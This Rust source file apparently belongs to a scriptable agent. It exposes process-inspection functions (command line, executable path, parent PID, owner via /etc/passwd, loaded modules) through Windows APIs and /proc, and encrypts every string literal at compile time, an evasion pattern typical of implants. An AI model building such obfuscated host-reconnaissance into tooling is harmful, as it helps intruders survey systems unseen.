// src/agent/scripting/procinfo.rs
use rhai::Engine;
use serde_json::json;
use crate::strcrypt_rt;
use strcrypt::aes_str;

pub fn register(engine: &mut Engine) {

    // ── Command line ──────────────────────────────────────────────────────────

    engine.register_fn(&aes_str!("internal_proc_cmdline"), |pid_str: &str| -> String {
        let pid: u32 = match pid_str.parse() { Ok(p) => p, Err(_) => return aes_str!("Error: invalid PID") };

        #[cfg(target_os = "linux")]
        {
            match std::fs::read(format!("{}{}{}", aes_str!("/proc/"), pid, aes_str!("/cmdline"))) {
                Ok(bytes) => bytes.split(|&b| b == 0)
                    .filter(|s| !s.is_empty())
                    .map(|s| String::from_utf8_lossy(s).to_string())
                    .collect::<Vec<_>>()
                    .join(" "),
                Err(e) => format!("{}{}", aes_str!("Error: "), e),
            }
        }
        #[cfg(target_os = "windows")]
        {
            // Read the PEB's ProcessParameters via NtQueryInformationProcess.
            // For simplicity use the snapshot approach which covers most cases.
            get_win_proc_cmdline(pid)
        }
        #[cfg(not(any(target_os = "linux", target_os = "windows")))]
        format!("{}{})", aes_str!("Error: not supported on this platform (pid "), pid)
    });

    // ── Binary path ───────────────────────────────────────────────────────────

    engine.register_fn(&aes_str!("internal_proc_path"), |pid_str: &str| -> String {
        let pid: u32 = match pid_str.parse() { Ok(p) => p, Err(_) => return aes_str!("Error: invalid PID") };

        #[cfg(target_os = "linux")]
        {
            match std::fs::read_link(format!("{}{}{}", aes_str!("/proc/"), pid, aes_str!("/exe"))) {
                Ok(p)  => p.to_string_lossy().to_string(),
                Err(e) => format!("{}{}", aes_str!("Error: "), e),
            }
        }
        #[cfg(target_os = "windows")]
        unsafe {
            use super::win_ffi::{win_ext::*, proc_ext::*};
            let h = OpenProcess(crate::config::config().ffi_windows.process_all_access, 0, pid);
            if h.is_null() { return format!("{}{})", aes_str!("Error: OpenProcess failed ("), GetLastError()); }
            let mut buf  = [0u16; 1024];
            let mut size = buf.len() as u32;
            let ok = QueryFullProcessImageNameW(h, 0, buf.as_mut_ptr(), &mut size);
            CloseHandle(h);
            if ok != 0 { wstr_to_string(&buf[..size as usize]) }
            else { format!("{}{})", aes_str!("Error: QueryFullProcessImageName failed ("), GetLastError()) }
        }
        #[cfg(not(any(target_os = "linux", target_os = "windows")))]
        format!("{}{})", aes_str!("Error: not supported on this platform (pid "), pid)
    });

    // ── Parent PID ────────────────────────────────────────────────────────────

    engine.register_fn(&aes_str!("internal_proc_parent"), |pid_str: &str| -> String {
        let pid: u32 = match pid_str.parse() { Ok(p) => p, Err(_) => return aes_str!("Error: invalid PID") };

        #[cfg(target_os = "linux")]
        {
            std::fs::read_to_string(format!("{}{}{}", aes_str!("/proc/"), pid, aes_str!("/status")))
                .ok()
                .and_then(|s| {
                    s.lines()
                        .find(|l| l.starts_with(&aes_str!("PPid:")))
                        .and_then(|l| l.split_whitespace().nth(1))
                        .map(|v| v.to_string())
                })
                .unwrap_or_else(|| format!("{}{}", aes_str!("Error: could not read status for pid "), pid))
        }
        #[cfg(target_os = "windows")]
        unsafe {
            use super::win_ffi::proc_ext::*;
            let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snap.is_null() { return aes_str!("Error: snapshot failed"); }
            let mut entry = ProcessEntry32W {
                dw_size: std::mem::size_of::<ProcessEntry32W>() as u32,
                cnt_usage: 0, th32_process_id: 0, th32_default_heap_id: 0,
                th32_module_id: 0, cnt_threads: 0, th32_parent_process_id: 0,
                pc_pri_class_base: 0, dw_flags: 0, sz_exe_file: [0u16; 260],
            };
            let mut found = aes_str!("Error: PID not found");
            if Process32FirstW(snap, &mut entry) != 0 {
                loop {
                    if entry.th32_process_id == pid {
                        found = entry.th32_parent_process_id.to_string();
                        break;
                    }
                    if Process32NextW(snap, &mut entry) == 0 { break; }
                }
            }
            super::win_ffi::win_ext::CloseHandle(snap);
            found
        }
        #[cfg(not(any(target_os = "linux", target_os = "windows")))]
        format!("{}{})", aes_str!("Error: not supported on this platform (pid "), pid)
    });

    // ── Owner username ────────────────────────────────────────────────────────

    engine.register_fn(&aes_str!("internal_proc_user"), |pid_str: &str| -> String {
        let pid: u32 = match pid_str.parse() { Ok(p) => p, Err(_) => return aes_str!("Error: invalid PID") };

        #[cfg(target_os = "linux")]
        {
            // Parse Uid from /proc/{pid}/status, then look up in /etc/passwd.
            let uid: u32 = std::fs::read_to_string(format!("{}{}{}", aes_str!("/proc/"), pid, aes_str!("/status")))
                .ok()
                .and_then(|s| {
                    s.lines()
                        .find(|l| l.starts_with(&aes_str!("Uid:")))
                        .and_then(|l| l.split_whitespace().nth(1))
                        .and_then(|v| v.parse().ok())
                })
                .unwrap_or(u32::MAX);
            if uid == u32::MAX { return format!("{}{}", aes_str!("Error: could not read UID for pid "), pid); }
            // Look up username in /etc/passwd.
            std::fs::read_to_string(aes_str!("/etc/passwd"))
                .ok()
                .and_then(|s| {
                    s.lines()
                        .find(|l| {
                            l.split(':').nth(2).and_then(|v| v.parse::<u32>().ok()) == Some(uid)
                        })
                        .and_then(|l| l.split(':').next().map(str::to_string))
                })
                .unwrap_or_else(|| uid.to_string())
        }
        #[cfg(not(target_os = "linux"))]
        format!("{}{})", aes_str!("Error: proc_user not supported on this platform (pid "), pid)
    });

    // ── Loaded modules ────────────────────────────────────────────────────────
    // Returns JSON array of {name, base_address, size}.

    engine.register_fn(&aes_str!("internal_proc_modules"), |pid_str: &str| -> String {
        let pid: u32 = match pid_str.parse() { Ok(p) => p, Err(_) => return aes_str!("Error: invalid PID") };

        #[cfg(target_os = "linux")]
        {
            // Parse /proc/{pid}/maps - filter to file-backed executable regions.
            match std::fs::read_to_string(format!("{}{}{}", aes_str!("/proc/"), pid, aes_str!("/maps"))) {
                Ok(content) => {
                    let mut seen = std::collections::HashSet::new();
                    let modules: Vec<serde_json::Value> = content.lines()
                        .filter(|l| l.contains('x') && l.contains('/'))
                        .filter_map(|l| {
                            let parts: Vec<&str> = l.splitn(6, ' ').collect();
                            if parts.len() < 6 { return None; }
                            let path = parts[5].trim().to_string();
                            if path.starts_with('[') || !seen.insert(path.clone()) { return None; }
                            let addrs: Vec<&str> = parts[0].split('-').collect();
                            let base = u64::from_str_radix(addrs.first()?, 16).ok()?;
                            let end  = u64::from_str_radix(addrs.get(1)?, 16).ok()?;
                            Some(json!({
                                aes_str!("name").as_str(): std::path::Path::new(&path).file_name()
                                    .map(|n| n.to_string_lossy().to_string())
                                    .unwrap_or(path),
                                "base": format!("{}{:x}", aes_str!("0x"), base),
                                aes_str!("size").as_str(): end - base,
                            }))
                        })
                        .collect();
                    serde_json::to_string(&modules).unwrap_or("[]".into())
                }
                Err(e) => format!("{}{}", aes_str!("Error: "), e),
            }
        }
        #[cfg(not(target_os = "linux"))]
        format!("{}{})", aes_str!("Error: proc_modules not supported on this platform (pid "), pid)
    });
}

// ─────────────────────────────────────────────────────────────────────────────
// Windows-only helpers
// ─────────────────────────────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn get_win_proc_cmdline(pid: u32) -> String {
    // On Windows, the best approach without ntdll imports is to fall back to
    // the WMI snapshot. Here we read it through the snapshot for simplicity.
    let procs = crate::utils::get_process_list();
    // The process list JSON contains {pid, name} entries; cmdline requires WMI.
    // Return a best-effort name from the snapshot.
    let Ok(list) = serde_json::from_str::<Vec<serde_json::Value>>(&procs) else {
        return format!("{}", aes_str!("Error: could not parse process list"));
    };
    list.iter()
        .find(|p| p[aes_str!("pid").as_str()].as_u64() == Some(pid as u64))
        .and_then(|p| p[aes_str!("name").as_str()].as_str())
        .map(|n| format!("[{}{}", n, aes_str!("] (full cmdline requires WMI)")))
        .unwrap_or_else(|| format!("{}{}{}", aes_str!("Error: PID "), pid, aes_str!(" not found")))
}